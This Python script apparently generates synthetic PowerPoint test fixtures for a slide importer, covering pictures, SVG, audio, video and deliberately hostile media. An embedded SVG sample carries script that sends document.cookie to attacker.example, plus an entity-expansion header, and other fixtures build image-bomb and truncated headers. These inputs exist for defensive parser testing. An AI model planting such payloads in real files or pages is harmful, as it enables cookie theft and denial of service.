#!/usr/bin/env python3
"""Tier 1H fixtures: pictures, SVG with its fallback, audio, video, and hostile media.
**Synthetic:** written to the schema and to MS-PPTX's example, not by PowerPoint. No real
deck in fixtures/real holds audio or video, so these are all that exercise those rows.

The media bytes are placeholders and are never decoded: an "mp4" here is a few bytes.

Imported by generate.py. Expected values are in crates/casual-slide-import/tests/media.rs
and crates/casual-slide-export/tests/media.rs.
"""
from generate import BLIP_EFFECTS, DECL, NS, PNG, TREE, deck, replace, zipped

MEDIA_REL = "http://schemas.microsoft.com/office/2007/relationships/media"
TRACK_REL = "http://schemas.microsoft.com/office/2017/04/relationships/track"
P14 = "http://schemas.microsoft.com/office/powerpoint/2010/main"
P173 = "http://schemas.microsoft.com/office/powerpoint/2017/3/main"
ASVG = "http://schemas.microsoft.com/office/drawing/2016/SVG/main"
WOE = "http://schemas.microsoft.com/office/word/2020/oembed"
AIF = "http://schemas.microsoft.com/office/drawing/2022/imageformula"
PIC14 = "http://schemas.microsoft.com/office/drawing/2010/picture"
PIC = "http://schemas.openxmlformats.org/drawingml/2006/picture"
LC = "http://schemas.openxmlformats.org/drawingml/2006/lockedCanvas"
EXT = '<a:extLst><a:ext uri="{00000000-0000-0000-0000-000000000001}"/></a:extLst>'
XFRM = '<a:xfrm><a:off x="0" y="0"/><a:ext cx="914400" cy="914400"/></a:xfrm><a:prstGeom prst="rect"><a:avLst/></a:prstGeom>'
SVG = (b'<?xml version="1.0"?>\n<!DOCTYPE svg [<!ENTITY x "x"><!ENTITY y "&x;&x;&x;">]>\n'
       b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" onload="alert(1)">'
       b'<script>fetch("https://attacker.example/steal?c="+document.cookie)</script>'
       b'<foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" src="https://attacker.example/"/></foreignObject>'
       b'<image xlink:href="https://attacker.example/track.png"/>&y;<unclosed>')
TYPES = [("/ppt/media/media1.mp4", "video/mp4"), ("/ppt/media/media2.mp3", "audio/mpeg"),
         ("/ppt/media/audio3.wav", "audio/wav"), ("/ppt/media/track1.vtt", "text/vtt"),
         ("/ppt/media/image2.svg", "image/svg+xml")]
PARTS = [("ppt/media/image1.png", PNG), ("ppt/media/image2.svg", SVG), ("ppt/media/media1.mp4", b"not a clip"),
         ("ppt/media/media2.mp3", b"not audio"), ("ppt/media/audio3.wav", b"not a wave"),
         ("ppt/media/track1.vtt", b"WEBVTT\n")]
# rId1 is the layout. Each of these is named in the tests, by number.
RELS = [("image", "../media/image1.png"),                                   # rId2
        ("image", "../media/image2.svg"),                                   # rId3
        ("video", "../media/media1.mp4"),                                   # rId4
        (MEDIA_REL, "../media/media1.mp4"),                                 # rId5
        ("audio", "../media/media2.mp3"),                                   # rId6
        (MEDIA_REL, "../media/media2.mp3"),                                 # rId7
        ("audio", "../media/audio3.wav"),                                   # rId8
        (TRACK_REL, "../media/track1.vtt"),                                 # rId9
        (TRACK_REL, "https://example.invalid/t.vtt", "External"),           # rId10
        ("video", "https://example.invalid/clip.mp4", "External"),          # rId11
        ("audio", "https://example.invalid/clip.mp3", "External"),          # rId12
        ("video", "file:///C:/clip.mov", "External"),                       # rId13
        ("image", "https://example.invalid/linked.png", "External"),        # rId14
        (MEDIA_REL, "https://example.invalid/clip2.mp4", "External"),       # rId15
        ("image", "https://example.invalid/linked.svg", "External")]        # rId16


def pic(sid, name, blip='<a:blip r:embed="rId2"/>', fill_rest='<a:stretch><a:fillRect/></a:stretch>'):
    return (f'<p:pic><p:nvPicPr><p:cNvPr id="{sid}" name="{name}"/><p:cNvPicPr/><p:nvPr/></p:nvPicPr>'
            f'<p:blipFill>{blip}{fill_rest}</p:blipFill><p:spPr>{XFRM}</p:spPr></p:pic>')


def media_pic(sid, name, app):
    return (f'<p:pic><p:nvPicPr><p:cNvPr id="{sid}" name="{name}"/><p:cNvPicPr/><p:nvPr>{app}</p:nvPr></p:nvPicPr>'
            f'<p:blipFill><a:blip r:embed="rId2"/><a:stretch><a:fillRect/></a:stretch></p:blipFill><p:spPr>{XFRM}</p:spPr></p:pic>')


def p14_media(attrs, kids=""):
    return (f'<p:extLst><p:ext uri="{{DAA4B4D4-6D71-4841-9C94-3DE7FCFB9230}}">'
            f'<p14:media xmlns:p14="{P14}" {attrs}>{kids}</p14:media></p:ext></p:extLst>')


TRACKS = ('<p14:extLst><p:ext uri="{3AFAAA56-56D3-431D-BCD4-E75A35582382}">'
          f'<p173:tracksInfo xmlns:p173="{P173}" displayLoc="media"><p173:trackLst>'
          '<p173:track id="{1C8F3A2E-5B6D-4E7F-8A9B-0C1D2E3F4A5B}" label="Captions" lang="en-US" r:embed="rId9"/>'
          '<p173:track id="{2C8F3A2E-5B6D-4E7F-8A9B-0C1D2E3F4A5B}" label="Remote" r:link="rId10"/>'
          '</p173:trackLst></p173:tracksInfo></p:ext></p14:extLst>')
BLIP_EXT = ('<a:extLst>'
            f'<a:ext uri="{{96DAC541-7B7A-43D3-8B79-37D633B846F1}}"><asvg:svgBlip xmlns:asvg="{ASVG}" r:embed="rId3" r:link="rId16"/></a:ext>'
            f'<a:ext uri="{{00000000-0000-0000-0000-000000000002}}"><aif:imageFormula xmlns:aif="{AIF}" formula="=A1"/></a:ext>'
            f'<a:ext uri="{{00000000-0000-0000-0000-000000000003}}"><woe:oembed xmlns:woe="{WOE}" oEmbedUrl="https://example.invalid/watch" mediaType="video" picLocksAutoForOEmbed="1"/></a:ext>'
            '</a:extLst>')
GLOBAL_ELEMENTS = ('<a:ext uri="{00000000-0000-0000-0000-000000000004}"><a:blip r:embed="rId2"/></a:ext>'
                   '<a:ext uri="{00000000-0000-0000-0000-000000000005}"><a:videoFile r:link="rId4"/></a:ext>')
LOCKS = ('<a:picLocks noGrp="1" noSelect="1" noRot="1" noChangeAspect="1" noMove="1" noResize="1" noEditPoints="1" noAdjustHandles="1" '
         f'noChangeArrowheads="1" noChangeShapeType="1" noCrop="1">{EXT}</a:picLocks>')


def everything_slide():
    """Every row of PIC and MEDIA at least once, each needle unique for the row test."""
    full = ('<p:pic><p:nvPicPr><p:cNvPr id="2" name="Everything"/>'
            f'<p:cNvPicPr preferRelativeResize="0">{LOCKS}{EXT}</p:cNvPicPr><p:nvPr/></p:nvPicPr>'
            f'<p:blipFill dpi="96" rotWithShape="1"><a:blip r:embed="rId2" cstate="print">{BLIP_EFFECTS}{BLIP_EXT}</a:blip>'
            '<a:srcRect l="1000" t="2000" r="3000" b="4000"/><a:stretch><a:fillRect l="5000" t="6000" r="7000" b="8000"/></a:stretch></p:blipFill>'
            f'<p:spPr>{XFRM}</p:spPr></p:pic>')
    tiled = pic(3, "Tiled", blip='<a:blip r:link="rId14"/>',
                fill_rest='<a:tile tx="1" ty="2" sx="50000" sy="60000" flip="xy" algn="ctr"/>')
    video = media_pic(4, "Video embedded", (
        f'<a:videoFile r:link="rId4" contentType="video/mp4">{EXT}</a:videoFile>' +
        p14_media('r:embed="rId5"',
                  '<p14:trim st="1000.5" end="2000"/><p14:fade in="300" out="400"/>'
                  '<p14:bmkLst><p14:bmk name="One" time="100"/><p14:bmk name="Two" time="200.25"/></p14:bmkLst>' + TRACKS)))
    linked = media_pic(5, "Video linked", '<a:videoFile r:link="rId11"/>' + p14_media('r:link="rId15"'))
    audio_tracks = ('<p14:extLst><p:ext uri="{3AFAAA56-56D3-431D-BCD4-E75A35582382}">'
                    f'<p173:tracksInfo xmlns:p173="{P173}" displayLoc="slide"/></p:ext></p14:extLst>')
    audio = media_pic(6, "Audio embedded", (f'<a:audioFile r:link="rId6" contentType="audio/mpeg">{EXT}</a:audioFile>' +
                                            p14_media('r:embed="rId7"', '<p14:trim st="5"/>' + audio_tracks)))
    audio_linked = media_pic(7, "Audio linked", '<a:audioFile r:link="rId12"/>')
    wav = media_pic(8, "Wave", '<a:wavAudioFile r:embed="rId8" name="chime.wav"/>')
    cd = media_pic(9, "CD", f'<a:audioCd><a:st track="1" time="2"/><a:end track="3" time="4"/>{EXT}</a:audioCd>')
    quicktime = media_pic(10, "QuickTime", f'<a:quickTimeFile r:link="rId13">{EXT}</a:quickTimeFile>')
    sound = ('<p:sp><p:nvSpPr><p:cNvPr id="11" name="Sound"><a:hlinkClick r:id="" action="ppaction://noaction">'
             '<a:snd r:embed="rId8" name="click.wav"/></a:hlinkClick></p:cNvPr><p:cNvSpPr/><p:nvPr/></p:nvSpPr>'
             f'<p:spPr>{XFRM}</p:spPr></p:sp>')
    frame = ('<p:graphicFrame><p:nvGraphicFramePr><p:cNvPr id="12" name="Word picture"/><p:cNvGraphicFramePr/><p:nvPr/></p:nvGraphicFramePr>'
             '<p:xfrm><a:off x="0" y="0"/><a:ext cx="1" cy="1"/></p:xfrm><a:graphic>'
             f'<a:graphicData uri="{PIC}"><pic:pic xmlns:pic="{PIC}" xmlns:pic14="{PIC14}"><pic:nvPicPr><pic:cNvPr id="1" name="p"/><pic:cNvPicPr/></pic:nvPicPr>'
             f'<pic:blipFill><a:blip r:embed="rId2"/></pic:blipFill><pic:spPr/><mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"><mc:Choice Requires="pic14"><pic14:style/><pic14:extLst/></mc:Choice><mc:Fallback/></mc:AlternateContent></pic:pic></a:graphicData></a:graphic></p:graphicFrame>')
    canvas = ('<p:graphicFrame><p:nvGraphicFramePr><p:cNvPr id="13" name="Canvas"/><p:cNvGraphicFramePr/><p:nvPr/></p:nvGraphicFramePr>'
              '<p:xfrm><a:off x="0" y="0"/><a:ext cx="1" cy="1"/></p:xfrm><a:graphic>'
              f'<a:graphicData uri="{LC}"><lc:lockedCanvas xmlns:lc="{LC}"><a:nvGrpSpPr><a:cNvPr id="1" name=""/><a:cNvGrpSpPr/></a:nvGrpSpPr><a:grpSpPr/>'
              '<a:pic><a:nvPicPr><a:cNvPr id="2" name="c"/><a:cNvPicPr/></a:nvPicPr><a:blipFill><a:blip r:embed="rId2"/></a:blipFill><a:spPr/>'
              f'<a:style><a:lnRef idx="0"><a:schemeClr val="accent1"/></a:lnRef><a:fillRef idx="0"><a:schemeClr val="accent1"/></a:fillRef><a:effectRef idx="0"><a:schemeClr val="accent1"/></a:effectRef><a:fontRef idx="minor"/></a:style>{EXT}</a:pic>'
              '</lc:lockedCanvas></a:graphicData></a:graphic></p:graphicFrame>')
    fill = ('<p:sp><p:nvSpPr><p:cNvPr id="14" name="Filled"/><p:cNvSpPr/><p:nvPr/></p:nvSpPr><p:spPr>'
            f'{XFRM}<a:blipFill><a:blip r:embed="rId2"/><a:srcRect l="9000"/><a:stretch/></a:blipFill></p:spPr></p:sp>')
    bullet = ('<p:sp><p:nvSpPr><p:cNvPr id="15" name="Bullet"/><p:cNvSpPr/><p:nvPr/></p:nvSpPr>'
              f'<p:spPr>{XFRM}</p:spPr><p:txBody><a:bodyPr/><a:p><a:pPr><a:buBlip><a:blip r:embed="rId2" cstate="email"><a:grayscl/>{BLIP_EXT}</a:blip></a:buBlip></a:pPr>'
              '<a:r><a:t>x</a:t></a:r></a:p></p:txBody></p:sp>')
    # The other compression values, for a fixture to hold each.
    compressed = "".join(pic(20 + i, f"Compressed {v}", blip=f'<a:blip r:embed="rId2" cstate="{v}"/>')
                         for i, v in enumerate(("screen", "hqprint", "none")))
    # `a:blip` and `a:videoFile` are global elements as well as local ones, and an extension
    # list is the one place in a deck the schema admits them as such. Reported, and kept.
    globals_ = ('<p:pic><p:nvPicPr><p:cNvPr id="30" name="Globals"><a:extLst>' + GLOBAL_ELEMENTS + '</a:extLst></p:cNvPr><p:cNvPicPr/><p:nvPr/></p:nvPicPr>'
                f'<p:blipFill><a:stretch/></p:blipFill><p:spPr>{XFRM}</p:spPr></p:pic>')
    body = full + tiled + video + linked + audio + audio_linked + wav + cd + quicktime + sound + frame + canvas + fill + bullet + compressed + globals_
    return f'{DECL}<p:sld {NS}><p:cSld><p:spTree>{TREE}{body}</p:spTree></p:cSld></p:sld>'


def everything_deck():
    entries = deck(slides=2, slide_rels=RELS, types_extra=TYPES, parts=PARTS)
    entries = replace(entries, "ppt/slides/slide1.xml", everything_slide())
    # The second slide shares the picture and nothing else in use.
    second = (f'{DECL}<p:sld {NS}><p:cSld><p:spTree>{TREE}{pic(2, "Shared")}</p:spTree></p:cSld></p:sld>')
    return replace(entries, "ppt/slides/slide2.xml", second)


def svg_deck():
    slide = (f'{DECL}<p:sld {NS}><p:cSld><p:spTree>{TREE}' +
             pic(2, "Scripted", blip=(f'<a:blip r:embed="rId2"><a:extLst><a:ext uri="{{96DAC541-7B7A-43D3-8B79-37D633B846F1}}">'
                                      f'<asvg:svgBlip xmlns:asvg="{ASVG}" r:embed="rId3"/></a:ext></a:extLst></a:blip>'),
                 fill_rest='<a:srcRect l="1000"/><a:stretch><a:fillRect/></a:stretch>') +
             '</p:spTree></p:cSld></p:sld>')
    entries = deck(slide_rels=[("image", "../media/image1.png"), ("image", "../media/image2.svg")],
                   types_extra=[("/ppt/media/image2.svg", "image/svg+xml")],
                   parts=[("ppt/media/image1.png", PNG), ("ppt/media/image2.svg", SVG)])
    return replace(entries, "ppt/slides/slide1.xml", slide)


def hostile():
    def with_slide(body, slide_rels=RELS, types=TYPES, parts=PARTS):
        entries = deck(slide_rels=slide_rels, types_extra=types, parts=parts)
        return zipped(replace(entries, "ppt/slides/slide1.xml",
                              f'{DECL}<p:sld {NS}><p:cSld><p:spTree>{TREE}{body}</p:spTree></p:cSld></p:sld>'))

    bookmark = '<p14:bmk name="b" time="1"/>'
    yield ("hostile/media-limit-bookmarks.bin",
           with_slide(media_pic(2, "b", p14_media('r:embed="rId5"', f'<p14:bmkLst>{bookmark * 4097}</p14:bmkLst>'))),
           "open CS-FND-0001 CS-FND-0007")
    track = '<p173:track id="{1C8F3A2E-5B6D-4E7F-8A9B-0C1D2E3F4A5B}" label="t"/>'
    yield ("hostile/media-limit-tracks.bin",
           with_slide(media_pic(2, "t", p14_media('r:embed="rId5"', (
               '<p14:extLst><p:ext uri="{3AFAAA56-56D3-431D-BCD4-E75A35582382}">'
               f'<p173:tracksInfo xmlns:p173="{P173}" displayLoc="slide"><p173:trackLst>{track * 1025}</p173:trackLst></p173:tracksInfo></p:ext></p14:extLst>')))),
           "open CS-FND-0001 CS-FND-0007")
    # Every wrong thing a reference can be, in one slide. Each is reported and none refuses.
    bad = (media_pic(2, "wrong type", '<a:videoFile r:link="rId2" contentType=""/><a:audioFile r:link="rId4"/>') +
           media_pic(3, "dangling", '<a:audioFile r:link="rId404"/>' + p14_media('r:embed="rId404" r:link="rId405"', '<p14:trim st="soon" end="-"/><p14:fade in="1e9"/><p14:bmkLst><p14:bmk/><p14:wat/></p14:bmkLst><p14:wat/>')) +
           media_pic(4, "embed outside", '<a:wavAudioFile r:embed="rId12"/>' + p14_media('r:embed="rId15"')) +
           media_pic(5, "no link", '<a:videoFile/>') +
           media_pic(6, "no embed", '<a:wavAudioFile/>') +
           media_pic(7, "cd", '<a:audioCd><a:st track="256" time="-1"/><a:st track="1"/><a:end/><a:wat/></a:audioCd>') +
           media_pic(8, "tracks", p14_media('', '<p14:extLst><p:ext uri="x"><p173:tracksInfo xmlns:p173="' + P173 + '" displayLoc="nowhere"><p173:trackLst><p173:track id="nope"/><p173:wat/></p173:trackLst><p173:trackLst/><p173:wat/></p173:tracksInfo><p173:tracksInfo xmlns:p173="' + P173 + '"/></p:ext></p14:extLst>')) +
           pic(9, "blips", blip=('<a:blip r:embed="rId4" r:link="rId2" cstate="zip"><a:extLst><a:ext uri="y">'
                                 f'<asvg:svgBlip xmlns:asvg="{ASVG}" r:embed="rId404"><a:wat/></asvg:svgBlip><asvg:svgBlip xmlns:asvg="{ASVG}"/>'
                                 f'<woe:oembed xmlns:woe="{WOE}"/><aif:imageFormula xmlns:aif="{AIF}" x="1"/></a:ext></a:extLst></a:blip>'),
               fill_rest='<a:srcRect l="x" t="999999999"/><a:tile sx="z"/><a:stretch/>') +
           pic(10, "no fallback", blip=f'<a:blip><a:extLst><a:ext uri="y"><asvg:svgBlip xmlns:asvg="{ASVG}" r:embed="rId3"/></a:ext></a:extLst></a:blip>'))
    yield "hostile/media-bad-references.bin", with_slide(bad), "open CS-FND-0001 CS-FND-0007"

    # Small files that claim enormous images, for SEC-C01. Header only, so not an image.
    bomb_png = b"\x89PNG\r\n\x1a\n" + b"\x00\x00\x00\rIHDR" + (0x7FFFFFFF).to_bytes(4, "big") * 2 + b"\x08\x06\x00\x00\x00"
    bomb_gif = b"GIF89a\xff\xff\xff\xff"
    bomb_jpeg = b"\xff\xd8\xff\xe0\x00\x04ab\xff\xc0\x00\x11\x08\xff\xff\xff\xff\x03"
    bomb_bmp = b"BM" + bytes(12) + (40).to_bytes(4, "little") + (0x7FFFFFFF).to_bytes(4, "little") + (0x80000001).to_bytes(4, "little")
    rel_images = [("image", f"../media/b{i}.{e}") for i, e in enumerate(("png", "gif", "jpg", "bmp"))]
    types = [("/ppt/media/b0.png", "image/png"), ("/ppt/media/b1.gif", "image/gif"), ("/ppt/media/b2.jpg", "image/jpeg"), ("/ppt/media/b3.bmp", "image/bmp")]
    yield ("hostile/media-image-bomb.bin",
           with_slide(pic(2, "bomb"), rel_images, types,
                      [("ppt/media/b0.png", bomb_png), ("ppt/media/b1.gif", bomb_gif), ("ppt/media/b2.jpg", bomb_jpeg), ("ppt/media/b3.bmp", bomb_bmp)]),
           "open")
    # Each lies about what it holds, or is cut short inside its header.
    liars = [("fake.png", "image/png", SVG), ("fake.jpg", "image/jpeg", PNG), ("cut.png", "image/png", b"\x89PNG\r\n\x1a\n\x00"),
             ("cut.jpg", "image/jpeg", b"\xff\xd8\xff"), ("cut2.jpg", "image/jpeg", b"\xff\xd8\xff\xe0\x00"), ("zero.jpg", "image/jpeg", b"\xff\xd8\xff\xe0\x00\x00"),
             ("run.jpg", "image/jpeg", b"\xff\xd8" + b"\xff" * 4096), ("cut.gif", "image/gif", b"GIF89a"), ("cut.bmp", "image/bmp", b"BM"), ("empty.png", "image/png", b"")]
    yield ("hostile/media-lying-images.bin",
           with_slide(pic(2, "liar"), [("image", f"../media/{n}") for n, _, _ in liars],
                      [(f"/ppt/media/{n}", t) for n, t, _ in liars], [(f"ppt/media/{n}", d) for n, _, d in liars]),
           "open")
    yield ("hostile/media-missing-target.bin",
           with_slide(pic(2, "gone"), [("image", "../media/gone.png")], [], []),
           "open CS-FND-0004")


def fixtures():
    """(relative path, bytes, manifest expectation), in a fixed order."""
    yield "generated/media-every-reference.pptx", zipped(everything_deck()), "open CS-FND-0001 CS-FND-0007"
    yield "generated/svg-with-script.pptx", zipped(svg_deck()), "open"
    yield from hostile()
